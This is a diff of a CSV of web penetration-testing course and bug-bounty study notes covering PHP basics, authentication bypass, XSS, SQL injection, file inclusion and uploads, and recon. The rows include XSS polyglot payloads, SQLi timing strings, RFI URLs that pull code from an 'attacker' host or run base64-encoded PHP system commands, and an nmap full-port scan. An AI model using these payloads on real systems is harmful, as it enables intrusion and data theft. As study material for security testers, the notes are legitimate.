-  If you absolutely need this, use some network controls to lower the risk",4. Client-Side Disc.,4.5 PHP,B4P140,,,,,sec542/4.5/index.htm#s5,,,,,
+  If you absolutely need this, use some network controls to lower the risk",4. Client-Side Disc.,PHP 4.50,B4P140,,,,,sec542/4.5/index.htm#s5,,,,,
 S542-4.5.06,SEC542,PHP Fundamentals,,,,,,"- Each statement is a comment to the server
 - Case senstive, variables: $var_name, arrys: $array_name[#]
-- If/Loop blocks: {}, Comments: //, # or /* */",4. Client-Side Disc.,4.5 PHP,B4P141,,,,,sec542/4.5/index.htm#s6,,,,,
+- If/Loop blocks: {}, Comments: //, # or /* */",4. Client-Side Disc.,PHP 4.50,B4P141,,,,,sec542/4.5/index.htm#s6,,,,,
 S542-4.5.07,SEC542,PHP Variables,,,,,,"- Vars are loosely typed. The type is determined at run time
 - Declared when using them:  $x=""Mike"";
 - Vars declared outside of functions are accessible anywhere in the script
-- Vars in a function are local to the function, except if using: global $var;",4. Client-Side Disc.,4.5 PHP,B4P142,,,,,sec542/4.5/index.htm#s7,,,,,
+- Vars in a function are local to the function, except if using: global $var;",4. Client-Side Disc.,PHP 4.50,B4P142,,,,,sec542/4.5/index.htm#s7,,,,,
 S542-4.5.08,SEC542,PHP: Accessing GET/POST Vars,,,,,,"- $_GET[], $_POST[]
 - foreach ($_GET as $name => $value){
     print ""$name : $value<br>"";}
 - $_POST[""Username""]
-- Filter/validate before using them! (otherwise XSS, SQL Injection...)",4. Client-Side Disc.,4.5 PHP,B4P143,,,,,sec542/4.5/index.htm#s8,,,,,
+- Filter/validate before using them! (otherwise XSS, SQL Injection...)",4. Client-Side Disc.,PHP 4.50,B4P143,,,,,sec542/4.5/index.htm#s8,,,,,
 S542-4.5.09,SEC542,PHP Control Statements,,,,,,"- while($i<=10){ $i++; }
-- for ($x=0; $x<=5; $x++) { echo $x; }",4. Client-Side Disc.,4.5 PHP,B4P144,,,,,sec542/4.5/index.htm#s9,,,,,
+- for ($x=0; $x<=5; $x++) { echo $x; }",4. Client-Side Disc.,PHP 4.50,B4P144,,,,,sec542/4.5/index.htm#s9,,,,,
 S542-4.5.10,SEC542,PHP Conditional Statements,,,,,,"- if {} else {}
 - switch($n){
      case 1:                 (case on integers or strings)
@@ -2543,25 +2792,25 @@ S542-4.5.10,SEC542,PHP Conditional Statements,,,,,,"- if {} else {}
          break;
      default:
          default code;
-  }",4. Client-Side Disc.,4.5 PHP,B4P145,,,,,sec542/4.5/index.htm#s10,,,,,
+  }",4. Client-Side Disc.,PHP 4.50,B4P145,,,,,sec542/4.5/index.htm#s10,,,,,
 S542-4.5.11,SEC542,PHP Functions,,,,,,"- function name(var, var){
      code;
   }
-- Use with: name();",4. Client-Side Disc.,4.5 PHP,B4P146,,,,,sec542/4.5/index.htm#s11,,,,,
+- Use with: name();",4. Client-Side Disc.,PHP 4.50,B4P146,,,,,sec542/4.5/index.htm#s11,,,,,
 S542-4.5.12,SEC542,PHP and Cookies,,,,,,"- setcookie(name, value, expire, path, domain);
   setcookie(""username"", ""Kevin"", ""Fri, 27-feb-2009"", ""/"", ""sec542.org"");
-- $username = $_COOKIE[""username""];",4. Client-Side Disc.,4.5 PHP,B4P147,,,,,sec542/4.5/index.htm#s12,,,,,
+- $username = $_COOKIE[""username""];",4. Client-Side Disc.,PHP 4.50,B4P147,,,,,sec542/4.5/index.htm#s12,,,,,
 S542-4.5.13,SEC542,PHP Superglobal Arrays,,,,,,"- $_GET, $_POST, $_COOKIE
 - $_SERVER: server settings (script name, client address...) 
 - $_ENV: vars set within the server env. running PHP
 - $_SESSION: values put into the session state of the app
-- $_FILES: array contain any files uploaded",4. Client-Side Disc.,4.5 PHP,B4P148,,,,,sec542/4.5/index.htm#s13,,,,,
+- $_FILES: array contain any files uploaded",4. Client-Side Disc.,PHP 4.50,B4P148,,,,,sec542/4.5/index.htm#s13,,,,,
 S542-4.5.14,SEC542,PHP Packages and PEAR,,,,,,"- PHP's main power comes from packages
 - PHP comes with PEAR (PHP Extension and App Repository) to get/upload packages in the cloud
   # pear install pkgname  (root to intall for the whole server)
   # pear search searchstring     (eg: pear search SMTP)
 - Useful packages: net_SMTP, Crypt_Blowfish, File_HtAccess, Services_Amazon_S3 (Amazon simple storage service)
-- You could publish hacking tools this way...",4. Client-Side Disc.,4.5 PHP,B4P149,,,,,sec542/4.5/index.htm#s14,,,,,
+- You could publish hacking tools this way...",4. Client-Side Disc.,PHP 4.50,B4P149,,,,,sec542/4.5/index.htm#s14,,,,,
 S542-4.5.15,SEC542,PHP HTTP Request Handling,,,,,,"- Many packages for HTTP but libCurl is built-in
 - <?php
    $ch = curl_init();
@@ -2569,26 +2818,26 @@ S542-4.5.15,SEC542,PHP HTTP Request Handling,,,,,,"- Many packages for HTTP but 
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ""name=Matt&pass=Q#RAgae"");
    $resp = curl_exec($ch);
-   curl_close($ch); ?>",4. Client-Side Disc.,4.5 PHP,B4P150,,,,,sec542/4.5/index.htm#s15,,,,,
-S542-4.5.16,SEC542,PHP: HTTP Uses,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P151,,,,,sec542/4.5/index.htm#s16,,,,,
-S542-4.5.17,SEC542,PHP Database Calls,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P152,,,,,sec542/4.5/index.htm#s17,,,,,
+   curl_close($ch); ?>",4. Client-Side Disc.,PHP 4.50,B4P150,,,,,sec542/4.5/index.htm#s15,,,,,
+S542-4.5.16,SEC542,PHP: HTTP Uses,,,,,,#NAME?,4. Client-Side Disc.,PHP 4.50,B4P151,,,,,sec542/4.5/index.htm#s16,,,,,
+S542-4.5.17,SEC542,PHP Database Calls,,,,,,#NAME?,4. Client-Side Disc.,PHP 4.50,B4P152,,,,,sec542/4.5/index.htm#s17,,,,,
 S542-4.5.18,SEC542,MySQL Functions in PHP,,,,,,"- MySQL:
    $db = mysql_connect(""localhost"", ""kevin"", ""mypasswd"");
    mysql_seelect_db(""zombiesdb"", $db);
    $sql = ""SELECT...""; 
    mysql_query($sql);  
-- Oracle: $db = oci8_connect",4. Client-Side Disc.,4.5 PHP,B4P153,,,,,sec542/4.5/index.htm#s18,,,,,
-S542-4.5.19,SEC542,,,,,,,,4. Client-Side Disc.,4.5 PHP,,,,,,sec542/4.5/index.htm#s19,,,,,
-S542-4.5.20,SEC542,PHP Exercise,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P155,,,,,sec542/4.5/index.htm#s20,,,,,
+- Oracle: $db = oci8_connect",4. Client-Side Disc.,PHP 4.50,B4P153,,,,,sec542/4.5/index.htm#s18,,,,,
+S542-4.5.19,SEC542,,,,,,,,4. Client-Side Disc.,PHP 4.50,,,,,,sec542/4.5/index.htm#s19,,,,,
+S542-4.5.20,SEC542,PHP Exercise,,,,,,#NAME?,4. Client-Side Disc.,PHP 4.50,B4P155,,,,,sec542/4.5/index.htm#s20,,,,,
 S542-4.5.21,SEC542,PHP Exercise: Create PHP page,,,,,,"- <?php echo (""Hello World""); ?>
-- Save to /var/www/php_exercise/index.php",4. Client-Side Disc.,4.5 PHP,B4P156,,,,,sec542/4.5/index.htm#s21,,,,,
-S542-4.5.22,SEC542,PHP Exercise: Display Server Config,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P157,,,,,sec542/4.5/index.htm#s22,,,,,
-S542-4.5.23,SEC542,PHP Exercise: Push JavaScript,,,,,,"- echo(""<script...",4. Client-Side Disc.,4.5 PHP,B4P158,,,,,sec542/4.5/index.htm#s23,,,,,
-S542-4.5.24,SEC542,PHP Exercise: Write to a file,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P159,,,,,sec542/4.5/index.htm#s24,,,,,
-S542-4.5.25,SEC542,PHP Exercise: Send info from JavaScrip to PHP,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P160,,,,,sec542/4.5/index.htm#s25,,,,,
-S542-4.5.26,SEC542,,,,,,,,4. Client-Side Disc.,4.5 PHP,,,,,,sec542/4.5/index.htm#s26,,,,,
-S542-4.5.27,SEC542,,,,,,,,4. Client-Side Disc.,4.5 PHP,,,,,,sec542/4.5/index.htm#s27,,,,,
-S542-4.5.28,SEC542,Conclusions,,,,,,#NAME?,4. Client-Side Disc.,4.5 PHP,B4P163,,,,,sec542/4.5/index.htm#s28,,,,,
+- Save to /var/www/php_exercise/index.php",4. Client-Side Disc.,PHP 4.50,B4P156,,,,,sec542/4.5/index.htm#s21,,,,,
+S542-4.5.22,SEC542,PHP Exercise: Display Server Config,,,,,,#NAME?,4. Client-Side Disc.,PHP 4.50,B4P157,,,,,sec542/4.5/index.htm#s22,,,,,
+S542-4.5.23,SEC542,PHP Exercise: Push JavaScript,,,,,,"- echo(""<script...",4. Client-Side Disc.,PHP 4.50,B4P158,,,,,sec542/4.5/index.htm#s23,,,,,
+S542-4.5.24,SEC542,PHP Exercise: Write to a file,,,,,,#NAME?,4. Client-Side Disc.,PHP 4.50,B4P159,,,,,sec542/4.5/index.htm#s24,,,,,
+S542-4.5.25,SEC542,PHP Exercise: Send info from JavaScrip to PHP,,,,,,#NAME?,4. Client-Side Disc.,PHP 4.50,B4P160,,,,,sec542/4.5/index.htm#s25,,,,,
+S542-4.5.26,SEC542,,,,,,,,4. Client-Side Disc.,PHP 4.50,,,,,,sec542/4.5/index.htm#s26,,,,,
+S542-4.5.27,SEC542,,,,,,,,4. Client-Side Disc.,PHP 4.50,,,,,,sec542/4.5/index.htm#s27,,,,,
+S542-4.5.28,SEC542,Conclusions,,,,,,#NAME?,4. Client-Side Disc.,PHP 4.50,B4P163,,,,,sec542/4.5/index.htm#s28,,,,,
 S542-5.1.01,SEC542,Exploitation (section start),,,,,,,5. Exploitation,5.1 Auth. Bypass,B5P01,,,,,sec542/5.1/index.htm#s1,,,,,
 S542-5.1.02,SEC542,,,,,,,,5. Exploitation,5.1 Auth. Bypass,,,,,,sec542/5.1/index.htm#s2,,,,,
 S542-5.1.03,SEC542,,,,,,,,5. Exploitation,5.1 Auth. Bypass,,,,,,sec542/5.1/index.htm#s3,,,,,
@@ -2601,7 +2850,7 @@ S542-5.1.07,SEC542,Expand the Foothold,,,,,,"-Expand foothold (beachhead). Pivot
 - Ref: 3 part webcast: Pentest Perfect Storm (combined pen tests)
 - Better understand the risk to the Org.",5. Exploitation,5.1 Auth. Bypass,B5P07,,,,,sec542/5.1/index.htm#s7,,,,,
 S542-5.1.08,SEC542,Exploits,,,,,,"- Focus on 3 categories: Bypass, Injection, Session-based exploits
-- Think as an evil person. What can you do with the exploit?  What access does it give you? Be able to explain real world attacks (don't exagerate, don't be sarcastic). What is the business problem that can be caused? ",5. Exploitation,5.1 Auth. Bypass,B5P08,,,,,sec542/5.1/index.htm#s8,,,,,
+- Think as an evil person. What can you do with the exploit?  What access does it give you? Be able to explain real world attacks (don't exagerate, don't be sarcastic). What is the business problem that can be caused?",5. Exploitation,5.1 Auth. Bypass,B5P08,,,,,sec542/5.1/index.htm#s8,,,,,
 S542-5.1.09,SEC542,,,,,,,,5. Exploitation,5.1 Auth. Bypass,,,,,,sec542/5.1/index.htm#s9,,,,,
 S542-5.1.10,SEC542,Authentication Bypass,,,,,,-,5. Exploitation,5.1 Auth. Bypass,B5P10,,,,,sec542/5.1/index.htm#s10,,,,,
 S542-5.1.11,SEC542,Authentication Bypass,,,,,,"- Accessing restricted content without authentication (admin console, higher priv., greater scope)
@@ -2834,7 +3083,7 @@ Please fill out the parameters:
 Status: Sec542 owns you!
 (dz) > generate
 Your completed exploit can be found there output/sec542.js
-(dz) > ",5. Exploitation,5.3 XSS,B5P105,,,,,sec542/5.3/index.htm#s33,,,,,
+(dz) >",5. Exploitation,5.3 XSS,B5P105,,,,,sec542/5.3/index.htm#s33,,,,,
 S542-5.3.34,SEC542,Durzosploit Exercise: Obfuscation,,,,,,"?(dz) > search obfuscators
 packr  - DeanEdward's packer
 minify - simple clean of the javascript code
@@ -3077,12 +3326,12 @@ S642-1.2.3.060,SEC642,5. File Inclusion Methodology,Local File Inclusion (LFI),L
 S642-1.2.3.061,SEC642,6. Limitations of File Inclusion (1),,,,,,,,1.2.3: File Inclusion and Code Execution,61,,,,,sec642/43270/index.htm#6,,,,,
 S642-1.2.3.062,SEC642,7. Limitations of File Inclusion (2),,,,,,,,1.2.3: File Inclusion and Code Execution,62,,,,,sec642/43270/index.htm#7,,,,,
 S642-1.2.3.063,SEC642,8. Pillaging Local File Inclusion,,,,,,,,1.2.3: File Inclusion and Code Execution,63,,,,,sec642/43270/index.htm#8,,,,,
-S642-1.2.3.064,SEC642,9. Preventing Execution in LFI (1),,,Exploitable LFI: PHP source disclosure,,,Exploit LFI by reading PHP source file by using �php://filter...�: Httpx://HOST/fileview.php?loc=php://filter/read=convert.base64-encode/resource=config.php,,1.2.3: File Inclusion and Code Execution,64,,,,,sec642/43270/index.htm#9,,,,,TRUE
+S642-1.2.3.064,SEC642,9. Preventing Execution in LFI (1),,,Exploitable LFI: PHP source disclosure,,,Exploit LFI by reading PHP source file by using php://filter...: Httpx://HOST/fileview.php?loc=php://filter/read=convert.base64-encode/resource=config.php,,1.2.3: File Inclusion and Code Execution,64,,,,,sec642/43270/index.htm#9,,,,,TRUE
 S642-1.2.3.065,SEC642,10. Preventing Execution in LFI (2),,,,,,,,1.2.3: File Inclusion and Code Execution,65,,,,,sec642/43270/index.htm#10,,,,,
 S642-1.2.3.066,SEC642,11. Course Roadmap,,,,,,,,1.2.3: File Inclusion and Code Execution,66,,,,,sec642/43270/index.htm#11,,,,,
 S642-1.2.3.067,SEC642,12. Code Execution with RFI,,,Exploitable RFI: PHP code injection,,,Example: httpx://fileview.php?loc=httpx://attacker/phpcode.txt,,1.2.3: File Inclusion and Code Execution,67,,,,,sec642/43270/index.htm#12,,,,,TRUE
 S642-1.2.3.068,SEC642,13. Firewall? No Problem!,,,,,,,,1.2.3: File Inclusion and Code Execution,68,,,,,sec642/43270/index.htm#13,,,,,
-S642-1.2.3.069,SEC642,14. PHP Stream Wrappers,PHP Code Injection via PHP stream in form input (RFI exploit),PHP Code Injection via PHP stream in form input (RFI exploit),Exploitable RFI: code injection via PHP stream in form input,PHP Code Injection via PHP stream in form input (RFI exploit),3,Exploit PHP RFI vuln via PHP command injection in POST input: <form action:�httpx://HOST/fileview.php?loc=php://input� method=�post� enctype=�text/plain�><input type=�text� name=�exploit� value=�<?php phpinfo(); ?>�  />,,1.2.3: File Inclusion and Code Execution,69,,,,,sec642/43270/index.htm#14,,,,,TRUE
+S642-1.2.3.069,SEC642,14. PHP Stream Wrappers,PHP Code Injection via PHP stream in form input (RFI exploit),PHP Code Injection via PHP stream in form input (RFI exploit),Exploitable RFI: code injection via PHP stream in form input,PHP Code Injection via PHP stream in form input (RFI exploit),3,Exploit PHP RFI vuln via PHP command injection in POST input: <form action:httpx://HOST/fileview.php?loc=php://input method=post enctype=text/plain><input type=text name=exploit value=<?php phpinfo(); ?>  />,,1.2.3: File Inclusion and Code Execution,69,,,,,sec642/43270/index.htm#14,,,,,TRUE
 S642-1.2.3.069,SEC642,14. PHP Stream Wrappers,Code Injection via PHP stream in URL param (RFI exploit),Code Injection via PHP stream in URL param (RFI exploit),Exploitable RFI: code injection via PHP stream in URL param,Code Injection via PHP stream in URL param (RFI exploit),3,"Exploit PHP RFI vuln with Base64-encoded command injection in GET param.: httpx://HOST/fileview.php?loc=data://text/plain;base64, PD9waHAgc3lzdGVtKCdscycpOyA/Pg==  (Base64-encoded PHP code)",,1.2.3: File Inclusion and Code Execution,69,,,,,sec642/43270/index.htm#14,,,,,TRUE
 S642-1.2.3.070,SEC642,15. Bypassing RFI Restrictions,Remote File Inclusion (RFI) via SMB (LFI/RFI exploit),Remote File Inclusion (RFI) via SMB (LFI/RFI exploit),Exploitable LFI: RFI via SMB,Remote File Inclusion (RFI) via SMB (LFI/RFI exploit),3,"On Windows, leverage the Windows web server's SMB client by using UNC Path \\HOST\FILE where a LFI vuln exist. Also try exploiting the SMB client (of web server) by sending to attacker-controlled SMB server (put XSS or phpshell page, capture SMB credentials...).",,1.2.3: File Inclusion and Code Execution,70,,,,,sec642/43270/index.htm#15,,,,,TRUE
 S642-1.2.3.071,SEC642,16. Exploiting File Inclusion w/ SMB,,,,,,,,1.2.3: File Inclusion and Code Execution,71,,,,,sec642/43270/index.htm#16,,,,,
@@ -3897,8 +4146,7 @@ Because competition is introduced; when working in a bug bounty it is essential 
 
 When desigining these templates there are two really great resources to read:
 - https://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/
-- https://forum.bugcrowd.com/t/writing-a-bug-report-attack-scenario-and-impact-are-key/640
-",1. Philosophy,,,,,,,https://github.com/jhaddix/tbhm/blob/master/01_Philosophy.md,,,,,
+- https://forum.bugcrowd.com/t/writing-a-bug-report-attack-scenario-and-impact-are-key/640",1. Philosophy,,,,,,,https://github.com/jhaddix/tbhm/blob/master/01_Philosophy.md,,,,,
 TBHM2015-S02,TBHM2015,Discovery,,,,,,"Find the road less traveled (sections less tested by others)
 
 This means find the app (or parts of an app) less tested. In wide-scoped projects, the flagship app will most likely be heavily assessed:
@@ -3918,7 +4166,7 @@ see https://github.com/jhaddix/domain)
 e.g: ./enumall.sh paypal.com
 
 LMGTFY: Let Me GOOGLE That For You
-site:paypal.com -www.paypal.com -www.sandbox ￼￼
+site:paypal.com -www.paypal.com -www.sandbox 
 
 List of Mergers and Acquisitions:
 - https://en.wikipedia.org/wiki/List_of_mergers_and_acquisitions_by_Facebook
@@ -3931,8 +4179,7 @@ A full port scan of all your new found targets will usually yield #win:
 - Facebook had Jenkins Script console with no auth
 - IIS.net had rdp open vulnerable to MS12_020
 - nmap -sS -A -PN -p- --script=http-title dontscanme.bro
-  (syn scan, OS + service fingerprint, no ping, all ports, http titles)
-",2. Discovery,,,,,,,https://github.com/jhaddix/tbhm/blob/master/02_Discovery.md,,,,,TRUE
+  (syn scan, OS + service fingerprint, no ping, all ports, http titles)",2. Discovery,,,,,,,https://github.com/jhaddix/tbhm/blob/master/02_Discovery.md,,,,,TRUE
 TBHM2015-S03,TBHM2015,Mapping,,,,,,"Mapping Tips:
 - Google
 - Smart* Directory Brute Forcing
@@ -3948,7 +4195,7 @@ TBHM2015-S03,TBHM2015,Mapping,,,,,,"Mapping Tips:
   - WPScan: http://wpscan.org/
   - CMSmap: https://github.com/Dionach/CMSmap
 
-￼Directory Bruteforce Workflow
+Directory Bruteforce Workflow
 After bruteforcing look for other status codes indicating you are denied or require auth then append list there to test for misconfigured access control.
 
 Example:
@@ -3957,7 +4204,7 @@ GET http://www.acme.com/backlog/ - 404
 GET http://www.acme.com/controlpanel/ - **401 hmm.. ok**
 GET http://www.acme.com/controlpanel/[bruteforce here now]
 
-￼￼Mapping/Vuln Discovery using OSINT
+Mapping/Vuln Discovery using OSINT
 Find previous/existing problem:
 - http://www.xssed.com
 - https://www.reddit.com/r/xss/
@@ -3972,9 +4219,7 @@ OSINT framework, simple to integrate. Features like:
 - DNS Subdomain Brute force
 - Web Spider
 - Nmap Scan
-- etc Code @ http://github.com/intrigueio/intrigue-core
-
-",3. Mapping,,,,,,,https://github.com/jhaddix/tbhm/blob/master/03_Mapping.md,,,,,TRUE
+- etc Code @ http://github.com/intrigueio/intrigue-core",3. Mapping,,,,,,,https://github.com/jhaddix/tbhm/blob/master/03_Mapping.md,,,,,TRUE
 TBHM2015-S04,TBHM2015,Auth and Session,,,,,,"Auth (better be quick)
 Auth Related (more in logic, priv, and transport sections)
 - User/pass discrepancy flaw
@@ -3992,8 +4237,7 @@ Session Related:
 - No new cookies on login/logout/timeout
 - Never ending cookie length
 - Multiple sessions allowed
-- Easily reversible cookie (base64 most often) ￼
-",4. Auth and Session,,,,,,,https://github.com/jhaddix/tbhm/blob/master/04_Authorization_and_Session.md,,,,,TRUE
+- Easily reversible cookie (base64 most often)",4. Auth and Session,,,,,,,https://github.com/jhaddix/tbhm/blob/master/04_Authorization_and_Session.md,,,,,TRUE
 TBHM2015-S05,TBHM2015,Tactical Fuzzing - XSS,,,,,3,"Core Idea: Does the page functionality display something to the users? For time sensitive testing the 80/20 rule applies. Many testers use Polyglot payloads. You probably have too!
 
 Multi-context, filter bypass based polyglot payload #1 (Rsnake XSS Cheat Sheet)
@@ -4004,14 +4248,14 @@ Multi-context, filter bypass based polyglot payload #2 (Ashar Javed XSS Research
  
 "">><marquee><img src=x onerror=confirm(1)></marquee>"" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"" ></script><script>alert(1)</script>""><img/id=""confirm&lpar; 1)""/alt=""/""src=""/""onerror=eval(id&%23x29;>'""><img src=""http: //i.imgur.com/P8mL8.jpg""> 
 
-￼￼```
+```
 
 ### Multi-context polyglot payload (Mathias Karlsson)
 
 "" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
 
 
-###￼ Other XSS Observations
+### Other XSS Observations
 
 Input Vectors:
 - Customizable Themes & Profiles via CSS
@@ -4030,15 +4274,13 @@ Input Vectors:
 Common Params:
 onload, allowedDomain, movieplayer, xmlPath, eventhandler, callback (more on OWASP page)
 
-Common Injection Strings:￼
+Common Injection Strings:
 
 %22})))}catch(e){alert(document.domain);}//
 
 ""]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
 
-""a"")(({type:""ready""}));}catch(e){alert(1)}//
-
-",5. XSS,,,,,,,https://github.com/jhaddix/tbhm/blob/master/05_XSS.md,80,,,,TRUE
+""a"")(({type:""ready""}));}catch(e){alert(1)}//",5. XSS,,,,,,,https://github.com/jhaddix/tbhm/blob/master/05_XSS.md,80,,,,TRUE
 TBHM2015-S06,TBHM2015,Tactical Fuzzing - SQLi,,,,,,"Core Idea: Does the page look like it might need to call on stored data?
 
 There exist some SQLi polyglots, i.e (Mathias Karlsson):
@@ -4047,7 +4289,7 @@ There exist some SQLi polyglots, i.e (Mathias Karlsson):
 Works in single quote context, works in double quote context, works in “straight into query” context!
 You can also leverage the large database of fuzzlists from Seclists (https://github.com/danielmiessler/SecLists)
 
-￼￼SQL Injection Observations
+SQL Injection Observations
 
 Blind is predominant, Error based is highly unlikely.
   ‘%2Bbenchmark(3200,SHA1(1))%2B’ 
@@ -4058,7 +4300,7 @@ SQLMap is king!
 - Use Tamper Scripts for blacklists.
 - SQLiPy Burp plugin works well to instrument SQLmap quickly. Lots of injection in web services!
 
-￼Best SQL injection resources
+Best SQL injection resources
 - MySQL:
   - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
   - https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
@@ -4076,13 +4318,12 @@ SQLMap is king!
   - http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet
   - http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet
   - https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet
-  - http://rails-sqli.org/
-",6. SQL Injection,,,,,,,https://github.com/jhaddix/tbhm/blob/master/06_SQLi.md,,,,,TRUE
+  - http://rails-sqli.org/",6. SQL Injection,,,,,,,https://github.com/jhaddix/tbhm/blob/master/06_SQLi.md,,,,,TRUE
 TBHM2015-S07,TBHM2015,Tactical Fuzzing - File Inclusion and Uploads,,,,,,"Local file inclusion
 Core Idea: Does it (or can it) interact with the server file system?
 Liffy (https://github.com/rotlogix/liffy) is new and cool here but you can also use Seclists (https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/JHADDIX_LFI.txt)
 
-￼￼Malicious File Upload
+Malicious File Upload
 This is an important and common attack vector in this type of testing. A file upload functions need a lot of protections to be adequately secure.
 
 Attacks:
@@ -4098,7 +4339,7 @@ File upload attacks are a whole presentation. Try this one to get a feel for byp
 
 As referenced file polyglots can be used to store malware on servers! See @dan_crowley ‘s talk: (http://goo.gl/pquXC2) and @angealbertini research (https://github.com/jhaddix/tbhm/blob/master/corkami.com):
 
-￼## Remote file includes and redirects
+## Remote file includes and redirects
 Look for any param with another web address in it. Same params from LFI can present here too.
 Common blacklist bypasses:
 - escape ""/"" with ""\/"" or “//” with “\/\/”
@@ -4110,7 +4351,7 @@ Common blacklist bypasses:
 - ”../” CHANGE TO “....//”
 - ”/” CHANGE TO “//”
 
-Redirections Common Parameters or Injection points￼:
+Redirections Common Parameters or Injection points:
 - dest=
 - continue=
 - redirect=
@@ -4130,8 +4371,7 @@ RFI Common Parameters or Injection points:
 - pdf=
 - template=
 - php_path=
-- doc=
-",7. File Inclusion and Uploads,,,,,,,https://github.com/jhaddix/tbhm/blob/master/07_File_Upload.md,,,,,TRUE
+- doc=",7. File Inclusion and Uploads,,,,,,,https://github.com/jhaddix/tbhm/blob/master/07_File_Upload.md,,,,,TRUE
 TBHM2015-S08,TBHM2015,CSRF,,,,,,"Everyone knows CSRF but the TLDR here is find sensitive functions and attempt to CSRF.
 Burps CSRF PoC is fast and easy for this
 
@@ -4182,7 +4422,7 @@ Common Functions or Views
 - payment processing view
 - any view with PII
 
-￼Insecure direct object references
+Insecure direct object references
 IDORs are common place in bounties, and hard to catch with scanners.
 Find any and all UIDs
 - increment
@@ -4206,7 +4446,7 @@ Most security concerned sites will enable HTTPs. It’s your job to ensure they�
 Examples:
 - Sensitive images transported over HTTP
 - Analytics with session data / PII leaked over HTTP
-(ForceSSL) [￼https://github.com/arvinddoraiswamy/mywebappscripts/tree/master/ForceSSL]. To use:
+(ForceSSL) [https://github.com/arvinddoraiswamy/mywebappscripts/tree/master/ForceSSL]. To use:
 1. Spider the app and generate a site map in Burp
 2. Select the sites/directories that you can using CTRL+Click; right-click in Burp and select 'Copy all URLs'
 3. Create a new file called https_urls in the same directory as this script.
@@ -4251,7 +4491,7 @@ TBHM2015-S11,TBHM2015,Auxiliary Info,,,,,,"The vulns formerly known as “noise�
 How to test a web app in n minute
 - How can you get maximum results within a given time window?
 
-￼￼Data Driven Assessment (diminishing return FTW)
+Data Driven Assessment (diminishing return FTW)
 - Visit the search, registration, contact, password reset, and comment forms and hit them with your polyglot strings
 - Scan those specific functions with Burp’s built-in scanner
 - Check your cookie, log out, check cookie, log in, check cookie. Submit old cookie, see if access.
@@ -4270,12 +4510,11 @@ More later (https://github.com/jhaddix):
 - SSRF
 - CAPTCHA bypass
 - Detailed logic flaws
-- More mobile
-",11. Other,,,,,,,https://github.com/jhaddix/tbhm/blob/master/11_Auxiliary_Info.md,,,,,TRUE
+- More mobile",11. Other,,,,,,,https://github.com/jhaddix/tbhm/blob/master/11_Auxiliary_Info.md,,,,,TRUE
 W2-S01.01.1,WAHH2,Configure proxy,Prep,Configure your browser to use your favorite integrated proxy/spidering tool. Both Burp and WebScarab,Intercepting Proxy Config (Non Issue),Explore Visible Content,0,Configure your browser to use your favorite integrated proxy/spidering tool. Both Burp and WebScarab can be used to passively spider the site by monitoring and parsing web content processed by the proxy.,1. Map the Application's Content,1.01. Explore Visible Content,1.1.1,Prep step.,,,,wahh2/index.htm#w1.1.1,0,,,,TRUE
-W2-S01.01.2,WAHH2,Configure browser plugins,Prep,"If you find it useful, configure your browser to use an extension such as IEWatch to monitor and ana",Preparatory step.,,0-Info,"If you find it useful, configure your browser to use an extension such as IEWatch to monitor and analyze the HTTP and HTML content being processed by the browser.",1. Map the Application's Content,1.01. Explore Visible Content,1.1.2,,,,,wahh2/index.htm#w1.1.2,0,,,,FALSE
+W2-S01.01.2,WAHH2,Configure browser plugins,Prep,"If you find it useful, configure your browser to use an extension such as IEWatch to monitor and ana",Preparatory step.,,0,"If you find it useful, configure your browser to use an extension such as IEWatch to monitor and analyze the HTTP and HTML content being processed by the browser.",1. Map the Application's Content,1.01. Explore Visible Content,1.1.2,,,,,wahh2/index.htm#w1.1.2,0,,,,FALSE
 W2-S01.01.3,WAHH2,Browse the app,Explore Visible Content,"Browse the entire application in the normal way, visiting every link and URL, submitting every form,",,Explore Visible Content,0,"Browse the entire application in the normal way, visiting every link and URL, submitting every form, and proceeding through all multistep functions to completion. Try browsing with JavaScript enabled and disabled, and with cookies enabled and disabled. Many applications can handle various browser configurations, and you may reach different content and code paths within the application.",1. Map the Application's Content,1.01. Explore Visible Content,1.1.3,,,,,wahh2/index.htm#w1.1.3,,,,,TRUE
-W2-S01.01.4,WAHH2,Authenticate to app,Explore Visible Content,"If the application uses authentication, and you have or can create a login account, use this to acce",,Explore Visible Content,0-Info,"If the application uses authentication, and you have or can create a login account, use this to access the protected functionality.",1. Map the Application's Content,1.01. Explore Visible Content,1.1.4,,,,,wahh2/index.htm#w1.1.4,89,FALSE,FALSE,FALSE,TRUE
+W2-S01.01.4,WAHH2,Authenticate to app,Explore Visible Content,"If the application uses authentication, and you have or can create a login account, use this to acce",,Explore Visible Content,0,"If the application uses authentication, and you have or can create a login account, use this to access the protected functionality.",1. Map the Application's Content,1.01. Explore Visible Content,1.1.4,,,,,wahh2/index.htm#w1.1.4,89,FALSE,FALSE,FALSE,TRUE
 W2-S01.01.5,WAHH2,Monitor requests and responses,Explore Visible Content,"As you browse, monitor the requests and responses passing through your intercepting proxy to gain an",,Explore Visible Content,,"As you browse, monitor the requests and responses passing through your intercepting proxy to gain an understanding of the kinds of data being submitted and the ways in which the client is used to control the behavior of the server-side application.",1. Map the Application's Content,1.01. Explore Visible Content,1.1.5,,,,,wahh2/index.htm#w1.1.5,,,,,TRUE
